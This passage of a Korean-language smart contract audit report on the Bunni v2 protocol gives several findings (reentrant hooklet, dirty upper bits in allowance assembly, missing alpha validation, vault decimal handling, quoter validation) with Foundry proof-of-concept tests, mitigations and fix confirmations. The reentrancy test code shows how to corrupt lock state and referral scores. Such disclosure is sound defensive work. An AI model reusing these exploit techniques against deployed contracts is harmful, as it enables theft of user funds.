    ERC20UnlockerMock internal unlocker;
    // address bob = makeAddr("bob");
    address payable bob;
    address alice = makeAddr("alice");
    address refA = makeAddr("refA");
    address refB = makeAddr("refB");
    Currency internal currency0;
    Currency internal currency1;
    PoolKey internal key;

    function setUp() public override {
        super.setUp();

        currency0 = CurrencyLibrary.ADDRESS_ZERO;
        currency1 = Currency.wrap(address(token1));

        // deploy BunniToken
        bytes32 ldfParams = bytes32(abi.encodePacked(ShiftMode.BOTH, int24(-30), int16(6), ALPHA));
        bytes memory hookParams = abi.encodePacked(
            FEE_MIN,
            FEE_MAX,
            FEE_QUADRATIC_MULTIPLIER,
            FEE_TWAP_SECONDS_AGO,
            POOL_MAX_AMAMM_FEE,
            SURGE_HALFLIFE,
            SURGE_AUTOSTART_TIME,
            VAULT_SURGE_THRESHOLD_0,
            VAULT_SURGE_THRESHOLD_1,
            REBALANCE_THRESHOLD,
            REBALANCE_MAX_SLIPPAGE,
            REBALANCE_TWAP_SECONDS_AGO,
            REBALANCE_ORDER_TTL,
            true, // amAmmEnabled
            ORACLE_MIN_INTERVAL,
            MIN_RENT_MULTIPLIER
        );

        // deploy ReentrantHooklet with all flags
        bytes32 salt;
        unchecked {
            bytes memory creationCode = abi.encodePacked(
                type(ReentrantHooklet).creationCode,
                abi.encode(
                    this,
                    hub,
                    User(bob)
                )
            );
            uint256 offset;
            while (true) {
                salt = bytes32(offset);
                address deployed = computeAddress(address(this), salt, creationCode);
                if (
                    uint160(bytes20(deployed)) & HookletLib.ALL_FLAGS_MASK == HookletLib.ALL_FLAGS_MASK
                        && deployed.code.length == 0
                ) {
                    break;
                }
                offset++;
            }
        }

        bob = payable(address(new User(address(token0), address(token1), address(weth))));
        vm.label(address(bob), "bob");
        vm.label(address(token0), "token0");
        vm.label(address(token1), "token1");
        ReentrantHooklet hooklet = new ReentrantHooklet{salt: salt}(this, hub, User(bob));

        if (currency0.isAddressZero()) {
            vm.deal(address(hooklet), 100 ether);
            vm.deal(address(bob), 100 ether);
        } else if (Currency.unwrap(currency0) == address(weth)) {
            vm.deal(address(this), 200 ether);
            weth.deposit{value: 200 ether}();
            weth.transfer(address(hooklet), 100 ether);
            weth.transfer(address(bob), 100 ether);
        } else {
            deal(Currency.unwrap(currency0), address(hooklet), 100 ether);
            deal(Currency.unwrap(currency0), address(bob), 100 ether);
        }

        if (Currency.unwrap(currency1) == address(weth)) {
            vm.deal(address(this), 200 ether);
            weth.deposit{value: 200 ether}();
            weth.transfer(address(hooklet), 100 ether);
            weth.transfer(address(bob), 100 ether);
        } else {
            deal(Currency.unwrap(currency1), address(hooklet), 100 ether);
            deal(Currency.unwrap(currency1), address(bob), 100 ether);
        }

        (bunniToken, key) = hub.deployBunniToken(
            IBunniHub.DeployBunniTokenParams({
                currency0: currency0,
                currency1: currency1,
                tickSpacing: 10,
                twapSecondsAgo: 7 days,
                liquidityDensityFunction: ldf,
                hooklet: IHooklet(address(hooklet)),
                ldfType: LDFType.DYNAMIC_AND_STATEFUL,
                ldfParams: ldfParams,
                hooks: bunniHook,
                hookParams: hookParams,
                vault0: ERC4626(address(0)),
                vault1: ERC4626(address(0)),
                minRawTokenRatio0: 0.08e6,
                targetRawTokenRatio0: 0.1e6,
                maxRawTokenRatio0: 0.12e6,
                minRawTokenRatio1: 0.08e6,
                targetRawTokenRatio1: 0.1e6,
                maxRawTokenRatio1: 0.12e6,
                sqrtPriceX96: uint160(Q96),
                name: "BunniToken",
                symbol: "BUNNI",
                owner: address(this),
                metadataURI: "",
                salt: bytes32(0)
            })
        );

        poolManager.setOperator(address(bunniToken), true);

        unlocker = new ERC20UnlockerMock(IERC20Lockable(address(bunniToken)));
        vm.label(address(unlocker), "unlocker");
        User(bob).updateUnlocker(address(unlocker));
    }

    function test_PoCUnlockerReentrantHooklet() external {
        uint256 amountAlice = _makeDeposit(key, 1 ether, 1 ether, alice, refA);
        uint256 amountBob = _makeDeposit(key, 1 ether, 1 ether, bob, refB);

        // lock account as `bob`
        vm.prank(bob);
        bunniToken.lock(unlocker, "");
        assertTrue(bunniToken.isLocked(bob), "isLocked returned false");
        assertEq(address(bunniToken.unlockerOf(bob)), address(unlocker), "unlocker incorrect");
        assertEq(unlocker.lockedBalances(bob), amountBob, "locked balance incorrect");

        // transfer from `alice` to `bob`
        vm.prank(alice);
        bunniToken.transfer(bob, amountAlice);

        assertEq(bunniToken.balanceOf(alice), 0, "alice balance not 0");
        assertEq(bunniToken.balanceOf(bob), amountAlice + amountBob, "bob balance not equal to sum of amounts");
        console2.log("locked balance of bob: %s", unlocker.lockedBalances(bob));
        console2.log("but bunniToken.isLocked(bob) actually now returns: %s", bunniToken.isLocked(bob));
    }

    function test_PoCMinInitialSharesScore() external {
        uint256 amount = _makeDeposit(key, 1 ether, 1 ether, alice, address(0));
        assertEq(bunniToken.scoreOf(address(0)), amount + MIN_INITIAL_SHARES, "initial score not 0");

        // transfer from `alice` to `bob` (re-entrant deposit)
        vm.prank(alice);
        bunniToken.transfer(bob, amount);

        console2.log("score of address(0): %s != %s", bunniToken.scoreOf(address(0)), MIN_INITIAL_SHARES);
        console2.log("score of refB: %s", bunniToken.scoreOf(refB));
    }

    function test_PoCCrossContractReentrantHooklet() external {
        // 1. Make initial deposit from alice with referrer refA
        address referrer = refA;
        assertEq(bunniToken.scoreOf(referrer), 0, "initial score not 0");
        console2.log("making initial deposit");
        uint256 amount = _makeDeposit(key, 1 ether, 1 ether, alice, referrer);
        assertEq(bunniToken.referrerOf(alice), referrer, "referrer incorrect");
        assertEq(bunniToken.balanceOf(alice), amount, "balance not equal to amount");
        assertEq(bunniToken.scoreOf(referrer), amount, "score not equal to amount");

        // 2. Distribute rewards
        poolManager.unlock(abi.encode(currency0, 1 ether));
        bunniToken.distributeReferralRewards(true, 1 ether);
        (uint256 claimable, ) = bunniToken.getClaimableReferralRewards(address(0));
        console2.log("claimable of address(0): %s", claimable);
        (claimable, ) = bunniToken.getClaimableReferralRewards(refA);
        console2.log("claimable of refA: %s", claimable);

        // 3. Transfer bunni token to bob (re-entrant)
        referrer = address(0);
        assertEq(bunniToken.referrerOf(bob), referrer, "bob initial referrer incorrect");
        assertEq(bunniToken.scoreOf(referrer), 1e12, "initial score of referrer not MIN_INITIAL_SHARES");
        referrer = refB;
        assertEq(bunniToken.scoreOf(referrer), 0, "initial score referrer not 0");

        console2.log("transferring (re-entrant deposit)");
        // update state in User contract to use refB in deposit
        referrer = refB;
        User(bob).updateReferrer(referrer);
        vm.prank(alice);
        bunniToken.transfer(bob, amount);

        // 4. After the transfer finishes
        assertEq(bunniToken.referrerOf(bob), referrer, "referrer incorrect");
        assertGt(bunniToken.balanceOf(bob), amount, "balance not greater than amount");

        uint256 totalSupply = bunniToken.totalSupply();
        uint256 totalScore = bunniToken.scoreOf(address(0)) + bunniToken.scoreOf(refA) + bunniToken.scoreOf(refB);
        console2.log("totalSupply: %s", totalSupply);
        console2.log("totalScore: %s", totalScore);

        address[] memory referrerAddresses = new address[](3);
        referrerAddresses[0] = address(0);
        referrerAddresses[1] = refA;
        referrerAddresses[2] = refB;
        uint256[] memory referrerScores = new uint256[](3);
        uint256[] memory claimableAmounts = new uint256[](3);
        for (uint256 i; i < referrerAddresses.length; i++) {
            referrerScores[i] = bunniToken.scoreOf(referrerAddresses[i]);
            console2.log("score of %s: %s", referrerAddresses[i], referrerScores[i]);
            (uint256 claimable0, ) =
                bunniToken.getClaimableReferralRewards(referrerAddresses[i]);
            claimableAmounts[i] = claimable0;
            console2.log("claimable amount of %s: %s", referrerAddresses[i], claimable0);
        }
    }
}
```

**Recommended Mitigation:** * `_afterTokenTransfer()` 후크가 실행의 맨 마지막에 호출되도록 잠금 해제 콜백 로직의 순서를 변경하십시오. 이는 `transferFrom()`, `_mint()`의 오버로드된 두 구현 모두, 그리고 `_transfer()`에도 적용됩니다.
* 교차 계약 재진입을 방지하기 위해 전역 가드를 적용하십시오.

**Bacon Labs:** [PR \#102](https://github.com/timeless-fi/bunni-v2/pull/102)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다. 이제 토큰 전송 후크가 잠금 해제 콜백 이후에 호출됩니다.


### Potentially dirty upper bits of narrow types could affect allowance computations in `ERC20Referrer`

**Description:** Solidity는 32바이트 너비를 채우지 않는 유형의 변수 상위 비트 내용에 대해 보장하지 않습니다. 예를 들어 `ERC20Referrer::_transfer`를 고려하십시오:

```solidity
function _transfer(address from, address to, uint256 amount) internal virtual override {
    bool toLocked;

    _beforeTokenTransfer(from, to, amount, address(0));
    /// @solidity memory-safe-assembly
    assembly {
        let from_ := shl(96, from)
        // Compute the balance slot and load its value.
        mstore(0x0c, _BALANCE_SLOT_SEED)
        mstore(0x00, from)
        let fromBalanceSlot := keccak256(0x0c, 0x20)
        let fromBalance := sload(fromBalanceSlot)
        ...
    }
    ...
}
```

여기서 그리고 `transferFrom()`에서도 비슷하게, 어셈블리 블록 내에 정의된 `from_` 변수는 잠재적으로 더러운(dirty) 상위 비트를 효과적으로 정리하기 위해 상위 96비트를 왼쪽으로 이동합니다. 그러나 이 변수는 실제로 사용되지 않습니다. 이 경우 keccak 해시는 상위 비트를 고려하지 않으므로 문제가 없습니다.

계약의 다른 어셈블리 사용은 상위 비트를 정리하기 위해 주소를 이동하지 못합니다. 예를 들어 `approve()` 및 `transferFrom()`에서 `spender` 주소의 상위 비트가 더러운 경우 허용량(allowance) 슬롯이 잘못 계산될 수 있습니다:

```solidity
function approve(address spender, uint256 amount) public virtual override returns (bool) {
    address msgSender = LibMulticaller.senderOrSigner();
    /// @solidity memory-safe-assembly
    assembly {
        // Compute the allowance slot and store the amount.
        mstore(0x20, spender)
        mstore(0x0c, _ALLOWANCE_SLOT_SEED)
        mstore(0x00, msgSender)
        sstore(keccak256(0x0c, 0x34), amount)
        // Emit the {Approval} event.
        mstore(0x00, amount)
        log3(0x00, 0x20, _APPROVAL_EVENT_SIGNATURE, msgSender, shr(96, mload(0x2c)))
    }
    return true;
}
```

**Impact:** 토큰 허용량이 잘못 계산될 수 있으며, 기능의 DoS가 발생할 가능성이 가장 높지만 의도하지 않은 스펜더에 대해 허용량이 설정될 가능성도 적습니다.

**Recommended Mitigation:** * `from_` 변수가 필요하지 않은 경우 제거하십시오.
* 안전하지 않은 것으로 간주될 수 있는 방식으로 어셈블리 블록에서 사용되는 모든 좁은 유형(narrow type) 변수의 상위 비트를 정리하십시오(예: `approve()` 및 `transferFrom()`).

**Bacon Labs:** [PR \#104](https://github.com/timeless-fi/bunni-v2/pull/104)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다. 이제 `ERC20Referrer`에서 좁은 유형의 상위 비트가 정리되었습니다.


### `LibBuyTheDipGeometricDistribution::cumulativeAmount0` will always return 0 due to insufficient `alphaX96` validation

**Description:** `LibBuyTheDipGeometricDistribution::isValidParams`와 `LibBuyTheDipGeometricDistribution::geometricIsValidParams`의 조합은 시프트 모드 강제를 제외하고 `LibGeometricDistribution::isValidParams`와 기능적으로 동일해야 하지만 실제로는 그렇지 않습니다.

```solidity
    function geometricIsValidParams(int24 tickSpacing, bytes32 ldfParams) internal pure returns (bool) {
        (int24 minUsableTick, int24 maxUsableTick) =
            (TickMath.minUsableTick(tickSpacing), TickMath.maxUsableTick(tickSpacing));

        // | shiftMode - 1 byte | minTickOrOffset - 3 bytes | length - 2 bytes | alpha - 4 bytes |
        uint8 shiftMode = uint8(bytes1(ldfParams));
        int24 minTickOrOffset = int24(uint24(bytes3(ldfParams << 8)));
        int24 length = int24(int16(uint16(bytes2(ldfParams << 32))));
        uint256 alpha = uint32(bytes4(ldfParams << 48));

        // ensure minTickOrOffset is aligned to tickSpacing
        if (minTickOrOffset % tickSpacing != 0) {
            return false;
        }

        // ensure length > 0 and doesn't overflow when multiplied by tickSpacing
        // ensure length can be contained between minUsableTick and maxUsableTick
        if (
            length <= 0 || int256(length) * int256(tickSpacing) > type(int24).max
                || length > maxUsableTick / tickSpacing || -length < minUsableTick / tickSpacing
        ) return false;

        // ensure alpha is in range
@>      if (alpha < MIN_ALPHA || alpha > MAX_ALPHA || alpha == ALPHA_BASE) return false;

        // ensure the ticks are within the valid range
        if (shiftMode == uint8(ShiftMode.STATIC)) {
            // static minTick set in params
            int24 maxTick = minTickOrOffset + length * tickSpacing;
            if (minTickOrOffset < minUsableTick || maxTick > maxUsableTick) return false;
        }

        // if all conditions are met, return true
        return true;
    }
```

누락된 `alphaX96` 검증은 `LibGeometricDistribution` 주석에 설명된 잠재적인 문제를 초래할 수 있습니다:

```solidity
    function isValidParams(int24 tickSpacing, uint24 twapSecondsAgo, bytes32 ldfParams) internal pure returns (bool) {
        ...
        // ensure alpha is in range
        if (alpha < MIN_ALPHA || alpha > MAX_ALPHA || alpha == ALPHA_BASE) return false;

@>      // ensure alpha != sqrtRatioTickSpacing which would cause cum0 to always be 0
        uint256 alphaX96 = alpha.mulDiv(Q96, ALPHA_BASE);
        uint160 sqrtRatioTickSpacing = tickSpacing.getSqrtPriceAtTick();
        if (alphaX96 == sqrtRatioTickSpacing) return false;
```

또한 `LibBuyTheDipGeometricDistribution::geometricIsValidParams`는 `LibGeometricDistribution::isValidParams`와 달리 최소 유동성 밀도를 검증하지 않습니다.

**Impact:** `LibBuyTheDipGeometricDistribution::geometricIsValidParams`의 현재 구현은 예상치 못한 동작을 유발하여 스왑 및 입금을 되돌릴 수 있는 `alpha` 구성을 방지하지 못합니다.

**Recommended Mitigation:** `alpha`가 범위 내에 있는지 확인하십시오:
```diff
        if (alpha < MIN_ALPHA || alpha > MAX_ALPHA || alpha == ALPHA_BASE) return false;
++      // ensure alpha != sqrtRatioTickSpacing which would cause cum0 to always be 0
++      uint256 alphaX96 = alpha.mulDiv(Q96, ALPHA_BASE);
++      uint160 sqrtRatioTickSpacing = tickSpacing.getSqrtPriceAtTick();
++      if (alphaX96 == sqrtRatioTickSpacing) return false;
```

또한 유동성 밀도가 0이 아니라 최소 `MIN_LIQUIDITY_DENSITY` 이상인지 확인하십시오.

**Bacon Labs:** [PR \#103](https://github.com/timeless-fi/bunni-v2/pull/103)에서 수정되었습니다. 최소 유동성 확인은 기본 LDF가 최소 필수 유동성보다 적을 수 있는 더 낮은 가격에 대체 LDF가 있을 수 있도록 의도적으로 생략되었습니다.

**Cyfrin:** 검증되었습니다. `LibBuyTheDipGeometricDistribution::geometricIsValidParams`에 알파 검증이 추가되었습니다.


### Queued withdrawals should use an external protocol-owned unlocker to prevent `BunniHub` earning referral rewards

**Description:** 활성 관리자와 함께 am-AMM이 활성화된 경우 인출을 대기열에 넣어야 합니다:

```solidity
    function withdraw(HubStorage storage s, Env calldata env, IBunniHub.WithdrawParams calldata params)
        external
        returns (uint256 amount0, uint256 amount1)
    {
        /// -----------------------------------------------------------------------
        /// Validation
        /// -----------------------------------------------------------------------

        if (!params.useQueuedWithdrawal && params.shares == 0) revert BunniHub__ZeroInput();

        PoolId poolId = params.poolKey.toId();
        PoolState memory state = getPoolState(s, poolId);
        IBunniHook hook = IBunniHook(address(params.poolKey.hooks));

        IAmAmm.Bid memory topBid = hook.getTopBidWrite(poolId);
@>      if (hook.getAmAmmEnabled(poolId) && topBid.manager != address(0) && !params.useQueuedWithdrawal) {
            revert BunniHub__NeedToUseQueuedWithdrawal();
    }
```

호출자의 Bunni 토큰은 `BunniHub`로 전송되어 `WITHDRAW_DELAY`가 지날 때까지 에스크로됩니다:

```solidity
    function queueWithdraw(HubStorage storage s, IBunniHub.QueueWithdrawParams calldata params) external {
        /// -----------------------------------------------------------------------
        /// Validation
        /// -----------------------------------------------------------------------

        PoolId id = params.poolKey.toId();
        IBunniToken bunniToken = _getBunniTokenOfPool(s, id);
        if (address(bunniToken) == address(0)) revert BunniHub__BunniTokenNotInitialized();

        /// -----------------------------------------------------------------------
        /// State updates
        /// -----------------------------------------------------------------------

        address msgSender = LibMulticaller.senderOrSigner();
        QueuedWithdrawal memory queued = s.queuedWithdrawals[id][msgSender];

        // update queued withdrawal
        // use unchecked to get unlockTimestamp to overflow back to 0 if overflow occurs
        // which is fine since we only care about relative time
        uint56 newUnlockTimestamp;
        unchecked {
            newUnlockTimestamp = uint56(block.timestamp) + WITHDRAW_DELAY;
        }
        if (queued.shareAmount != 0) {
            // requeue expired queued withdrawal
            if (queued.unlockTimestamp + WITHDRAW_GRACE_PERIOD >= block.timestamp) {
                revert BunniHub__NoExpiredWithdrawal();
            }
            s.queuedWithdrawals[id][msgSender].unlockTimestamp = newUnlockTimestamp;
        } else {
            // create new queued withdrawal
            if (params.shares == 0) revert BunniHub__ZeroInput();
            s.queuedWithdrawals[id][msgSender] =
                QueuedWithdrawal({shareAmount: params.shares, unlockTimestamp: newUnlockTimestamp});
        }

        /// -----------------------------------------------------------------------
        /// External calls
        /// -----------------------------------------------------------------------

        if (queued.shareAmount == 0) {
            // transfer shares from msgSender to address(this)
@>          bunniToken.transferFrom(msgSender, address(this), params.shares);
        }

        emit IBunniHub.QueueWithdraw(msgSender, id, params.shares);
    }
```

그러나 이것은 `BunniToken`이 `ERC20Referrer`를 상속하고 추천인 점수를 업데이트하는 전송 후크를 호출한다는 사실을 간과합니다. `BunniHub`는 자체 추천인을 지정하지 않으므로 호출자의 실제 추천인에게 계속 적용되어야 할 추천 보상이 프로토콜에 적립되는 결과를 초래합니다.

**Impact:** 대기열에 있는 인출로 인해 추천인이 분배된 보상을 받지 못할 수 있습니다.

**Recommended Mitigation:** 인출을 위해 대기 중인 Bunni 토큰을 `BunniHub`로 전송하는 대신, 대기 중인 인출 시 토큰을 잠그고 지연 시간이 지나면 다시 잠금 해제하는 별도의 `IERC20Unlocker` 계약을 구현하는 것을 고려하십시오. 이는 또한 `BunniHub`가 보유한 중첩된 Bunni 토큰 준비금과의 잠재적인 충돌을 방지하는 데 도움이 됩니다.

**Bacon Labs:** 인지됨(Acknowledged). 인출은 아주 짧은 시간 동안만 대기되므로 프로토콜로 가는 추천 보상이 최소화될 것이기 때문에 기존 구현에 동의합니다.

**Cyfrin:** 대기열에 있는 인출이 실제로 예상 기간 내에 처리된다고 가정하고 인지함(Acknowledged).


### Potential erroneous surging when vault token decimals differ from the underlying asset

**Description:** `BunniHookLogic::_shouldSurgeFromVaults`에서 볼트 주식 가격을 계산할 때 로직은 볼트 주식 토큰 소수점 자릿수가 기본 자산의 소수점 자릿수와 같을 것이라고 가정합니다:

```solidity
// compute current share prices
uint120 sharePrice0 =
    bunniState.reserve0 == 0 ? 0 : reserveBalance0.divWadUp(bunniState.reserve0).toUint120();
uint120 sharePrice1 =
    bunniState.reserve1 == 0 ? 0 : reserveBalance1.divWadUp(bunniState.reserve1).toUint120();
// compare with share prices at last swap to see if we need to apply the surge fee
// surge fee is applied if the share price has increased by more than 1 / vaultSurgeThreshold
shouldSurge = prevSharePrices.initialized
    && (
        dist(sharePrice0, prevSharePrices.sharePrice0)
            > prevSharePrices.sharePrice0 / hookParams.vaultSurgeThreshold0
            || dist(sharePrice1, prevSharePrices.sharePrice1)
                > prevSharePrices.sharePrice1 / hookParams.vaultSurgeThreshold1
    );
```

여기서 `reserveBalance0/1`은 기본 자산의 소수점 단위인 반면, `bunniState.reserve0/1`은 볼트 주식 토큰의 소수점 단위입니다. 결과적으로 계산된 `sharePrice0/1`은 예상된 18 소수점보다 훨씬 많거나 적을 수 있습니다.

ERC-4626 사양은 볼트 주식 토큰 소수점 자릿수가 기본 자산의 소수점 자릿수를 반영할 것을 강력히 권장하지만 항상 그런 것은 아닙니다. 예를 들어 이 [Morpho vault](https://etherscan.io/address/0xd508f85f1511aaec63434e26aeb6d10be0188dc7)는 18 소수점 주식 토큰을 가지고 있지만 기본 WBTC는 8 소수점을 가지고 있습니다. 표준을 엄격하게 준수하는 이러한 볼트는 주식 가격이 항상 `WAD` 정밀도라는 가정을 깨고 기본 자산에 해당하는 8이 되어, 그렇지 않아야 할 경우에도 서지가 필요하다고 간주될 수 있습니다.

테스트에 지정된 대로 `1e3`의 `vaultSurgeThreshold`를 고려하면 절대 주식 가격 차이가 0.1%보다 클 때 로직이 서지를 트리거합니다. 주식 가격이 8 소수점인 위의 경우 주식 가격이 1보다 크다고 가정하면 임계값이 최대 `0.000001%`로 지정될 수 있음을 의미합니다. 이는 `type(uint16).max`의 가능한 최대 임계값이 지정될 때는 문제가 되지 않습니다. 이는 약 `0.0015%`에 해당하기 때문입니다. 그러나 볼트가 마이너스 수익률을 가지면 주식 가격이 1 아래로 떨어지고 가능한 정밀도가 더 떨어질 수 있으며, 볼트/자산 소수점 차이가 커질수록 더 증폭되어 더 낮은 정밀도의 주식 가격이 발생합니다. 최악의 경우 가능성은 낮지만 이 나눗셈은 0으로 내림되고 주식 가격의 절대적인 변화는 0보다 크기 때문에 실제로는 필요하지 않을 때 서지가 실행됩니다. 임계값은 불변이므로 이러한 상황을 피하는 것은 쉽지 않습니다.

또한 이 엣지 케이스는 주식 토큰 소수점 자릿수가 기본 자산의 소수점 자릿수보다 작을 때 볼트 주식 가격이 `uint120`을 오버플로우할 가능성을 초래합니다. 예를 들어 18 소수점 기본 자산에 대한 6 소수점 주식 토큰은 단일 주식이 `1_329_388` 자산 이상의 가치가 있을 때 오버플로우됩니다.

**Impact:** 필요하지 않을 때 서지하면 실제로 원하지 않을 때 기존 리밸런스 주문이 삭제될 수 있으며, 필요 이상으로 큰 동적/서지 수수료를 계산하여 사용자가 스왑하지 못하게 할 수 있습니다. 오버플로우 주식 가격은 스왑에 대한 DoS를 초래합니다.

**Recommended Mitigation:** 볼트 주식 토큰과 기본 자산 소수점을 명시적으로 처리하여 주식 가격이 항상 예상되는 18 소수점 정밀도가 되도록 하십시오.

**Bacon Labs:** [PR \#100](https://github.com/timeless-fi/bunni-v2/pull/100)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다. 이제 `_shouldSurgeFromVaults()`의 주식 가격 계산 중에 토큰/볼트 값이 명시적으로 스케일링됩니다.


### Missing validation in `BunniQuoter` results in incorrect quotes

**Description:** `BunniQuoter::quoteDeposit`은 호출자가 올바른 볼트 수수료를 제공했다고 가정합니다. 그러나 0이 아닌 볼트 수수료가 있는 볼트에 대해 0의 볼트 수수료가 전달되면 아래 PoC와 같이 반환된 견적은 올바르지 않습니다. 또한 기존 주식 공급이 있는 경우 이 함수는 기존 토큰 금액에 대한 검증이 누락되었습니다. 구체적으로 두 토큰 금액이 모두 0이면 `BunniHub`는 실행을 되돌리는 반면 쿼터는 `type(uint256).max`의 주식 금액과 함께 성공을 반환합니다:

```solidity
    ...
    if (existingShareSupply == 0) {
        // ensure that the added amounts are not too small to mess with the shares math
        if (addedAmount0 < MIN_DEPOSIT_BALANCE_INCREASE && addedAmount1 < MIN_DEPOSIT_BALANCE_INCREASE) {
            revert BunniHub__DepositAmountTooSmall();
        }
        // no existing shares, just give WAD
        shares = WAD - MIN_INITIAL_SHARES;
        // prevent first staker from stealing funds of subsequent stakers
        // see https://code4rena.com/reports/2022-01-sherlock/#h-01-first-user-can-steal-everyone-elses-tokens
        shareToken.mint(address(0), MIN_INITIAL_SHARES, address(0));
    } else {
        // given that the position may become single-sided, we need to handle the case where one of the existingAmount values is zero
@>      if (existingAmount0 == 0 && existingAmount1 == 0) revert BunniHub__ZeroSharesMinted();
        shares = FixedPointMathLib.min(
            existingAmount0 == 0 ? type(uint256).max : existingShareSupply.mulDiv(addedAmount0, existingAmount0),
            existingAmount1 == 0 ? type(uint256).max : existingShareSupply.mulDiv(addedAmount1, existingAmount1)
        );
        if (shares == 0) revert BunniHub__ZeroSharesMinted();
    }
    ...
```

`BunniQuoter::quoteWithdraw`는 정적 호출을 사용하는 `getTopBid()` 함수를 통해 가져올 수 있는 am-AMM 관리자가 존재하는 경우 대기열 인출에 필요한 검증이 누락되었습니다:

```diff
    function quoteWithdraw(address sender, IBunniHub.WithdrawParams calldata params)
        external
        view
        override
        returns (bool success, uint256 amount0, uint256 amount1)
    {
        PoolId poolId = params.poolKey.toId();
        PoolState memory state = hub.poolState(poolId);
        IBunniHook hook = IBunniHook(address(params.poolKey.hooks));

        IAmAmm.Bid memory topBid = hook.getTopBid(poolId);
        if (hook.getAmAmmEnabled(poolId) && topBid.manager != address(0) && !params.useQueuedWithdrawal) {
            return (false, 0, 0);
        }
        ...
    }
```

이 함수는 또한 발신자가 이미 기존 대기열 인출을 가지고 있는지 확인해야 합니다. `BunniHub`가 대기열 인출을 가져오는 기능을 노출하지 않기 때문에 현재는 이를 확인할 수 없습니다. 그러나 `useQueuedWithdrawal`이 true인 경우 사용자가 실행 가능한 기간 내에 있는 기존 대기열 인출을 가지고 있는지 확인해야 합니다. 이 시나리오에서 토큰 금액 계산은 대기 중인 인출에서 주식 금액을 가져와 수행해야 합니다.

**Proof of Concept**
먼저 `test/mocks/ERC4626Mock.sol` 내에 다음 `ERC4626FeeMock`을 생성하십시오:

```solidity
contract ERC4626FeeMock is ERC4626 {
    address internal immutable _asset;
    uint256 public fee;
    uint256 internal constant MAX_FEE = 10000;

    constructor(IERC20 asset_, uint256 _fee) {
        _asset = address(asset_);
        if(_fee > MAX_FEE) revert();
        fee = _fee;
    }

    function setFee(uint256 newFee) external {
        if(newFee > MAX_FEE) revert();
        fee = newFee;
    }

    function deposit(uint256 assets, address to) public override returns (uint256 shares) {
        return super.deposit(assets - assets * fee / MAX_FEE, to);
    }

    function asset() public view override returns (address) {
        return _asset;
    }

    function name() public pure override returns (string memory) {
        return "MockERC4626";
    }

    function symbol() public pure override returns (string memory) {
        return "MOCK-ERC4626";
    }
}
```

그리고 `test/BaseTest.sol` 가져오기에 추가하십시오:

```diff
--  import {ERC4626Mock} from "./mocks/ERC4626Mock.sol";
++  import {ERC4626Mock, ERC4626FeeMock} from "./mocks/ERC4626Mock.sol";
```

이제 다음 테스트를 `test/BunniHub.t.sol` 내에서 실행할 수 있습니다:
```solidity
function test_QuoterAssumingCorrectVaultFee() public {
    ILiquidityDensityFunction uniformDistribution = new UniformDistribution(address(hub), address(bunniHook), address(quoter));
    Currency currency0 = Currency.wrap(address(token0));
    Currency currency1 = Currency.wrap(address(token1));
    ERC4626FeeMock feeVault0 = new ERC4626FeeMock(token0, 0);
    ERC4626 vault0_ = ERC4626(address(feeVault0));
    ERC4626 vault1_ = ERC4626(address(0));
    IBunniToken bunniToken;
    PoolKey memory key;
    (bunniToken, key) = hub.deployBunniToken(
        IBunniHub.DeployBunniTokenParams({
            currency0: currency0,
            currency1: currency1,
            tickSpacing: TICK_SPACING,
            twapSecondsAgo: TWAP_SECONDS_AGO,
            liquidityDensityFunction: uniformDistribution,
            hooklet: IHooklet(address(0)),
            ldfType: LDFType.DYNAMIC_AND_STATEFUL,
            ldfParams: bytes32(abi.encodePacked(ShiftMode.STATIC, int24(-5) * TICK_SPACING, int24(5) * TICK_SPACING)),
            hooks: bunniHook,
            hookParams: abi.encodePacked(
                FEE_MIN,
                FEE_MAX,
                FEE_QUADRATIC_MULTIPLIER,
                FEE_TWAP_SECONDS_AGO,
                POOL_MAX_AMAMM_FEE,
                SURGE_HALFLIFE,
                SURGE_AUTOSTART_TIME,
                VAULT_SURGE_THRESHOLD_0,
                VAULT_SURGE_THRESHOLD_1,
                REBALANCE_THRESHOLD,
                REBALANCE_MAX_SLIPPAGE,
                REBALANCE_TWAP_SECONDS_AGO,
                REBALANCE_ORDER_TTL,
                true, // amAmmEnabled
                ORACLE_MIN_INTERVAL,
                MIN_RENT_MULTIPLIER
            ),
            vault0: vault0_,
            vault1: vault1_,
            minRawTokenRatio0: 0.20e6,
            targetRawTokenRatio0: 0.30e6,
            maxRawTokenRatio0: 0.40e6,
            minRawTokenRatio1: 0,
            targetRawTokenRatio1: 0,
            maxRawTokenRatio1: 0,
            sqrtPriceX96: TickMath.getSqrtPriceAtTick(0),
            name: bytes32("BunniToken"),
            symbol: bytes32("BUNNI-LP"),
            owner: address(this),
            metadataURI: "metadataURI",
            salt: bytes32(0)
        })
    );

    // make initial deposit to avoid accounting for MIN_INITIAL_SHARES
    uint256 depositAmount0 = 1e18 + 1;
    uint256 depositAmount1 = 1e18 + 1;
```solidity
    address firstDepositor = makeAddr("firstDepositor");
    vm.startPrank(firstDepositor);
    token0.approve(address(PERMIT2), type(uint256).max);
    token1.approve(address(PERMIT2), type(uint256).max);
    PERMIT2.approve(address(token0), address(hub), type(uint160).max, type(uint48).max);
    PERMIT2.approve(address(token1), address(hub), type(uint160).max, type(uint48).max);
    vm.stopPrank();

    // mint tokens
    _mint(key.currency0, firstDepositor, depositAmount0 * 100);
    _mint(key.currency1, firstDepositor, depositAmount1 * 100);

    // deposit tokens
    IBunniHub.DepositParams memory depositParams = IBunniHub.DepositParams({
        poolKey: key,
        amount0Desired: depositAmount0,
        amount1Desired: depositAmount1,
        amount0Min: 0,
        amount1Min: 0,
        deadline: block.timestamp,
        recipient: firstDepositor,
        refundRecipient: firstDepositor,
        vaultFee0: 0,
        vaultFee1: 0,
        referrer: address(0)
    });

    vm.prank(firstDepositor);
    (uint256 sharesFirstDepositor, uint256 firstDepositorAmount0In, uint256 firstDepositorAmount1In) = hub.deposit(depositParams);

    IdleBalance idleBalanceBefore = hub.idleBalance(key.toId());
    (uint256 idleAmountBefore, bool isToken0Before) = IdleBalanceLibrary.fromIdleBalance(idleBalanceBefore);
    feeVault0.setFee(1000);     // 10% fee

    depositAmount0 = 1e18;
    depositAmount1 = 1e18;
    address secondDepositor = makeAddr("secondDepositor");
    vm.startPrank(secondDepositor);
    token0.approve(address(PERMIT2), type(uint256).max);
    token1.approve(address(PERMIT2), type(uint256).max);
    PERMIT2.approve(address(token0), address(hub), type(uint160).max, type(uint48).max);
    PERMIT2.approve(address(token1), address(hub), type(uint160).max, type(uint48).max);
    vm.stopPrank();

    // mint tokens
